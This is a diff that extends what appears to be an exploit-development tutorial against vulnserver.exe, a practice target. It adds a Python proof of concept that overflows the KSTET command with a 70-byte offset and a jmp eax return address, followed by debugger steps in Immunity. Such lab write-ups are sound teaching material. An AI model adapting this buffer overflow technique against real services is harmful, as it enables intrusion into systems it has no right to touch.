@@ -82,3 +82,33 @@ s.send(command+crash)
 After executing the POC, here is what the debugger shows:
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/01.png" alt="">
+
+After examining the crash, it seems as though EAX is going to be the best place for us to start building our shellcode.
+
+Skipping some of the formalities, the POC has been updated to incorporate the proper offset to EIP and a `jmp eax` instruction:
+
+```python
+import os
+import sys
+import socket
+
+# Vulnerable command
+command = "KSTET "
+
+# 2000 bytes to crash vulnserver.exe
+crash = "\x41" * 70
+crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\x43" * (2000-len(crash))
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("172.16.55.143", 9999))
+
+s.send(command+crash)
+```
+
+Let' find the function call now. Close Immunity and vulnserver.exe. Restart vulnserver.exe and the reattach within Immunity.
+
+Right click on any disassembled instruction, and select __View > Module 'vulnserv'__ (the executable itself).
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/02.png" alt="">
+
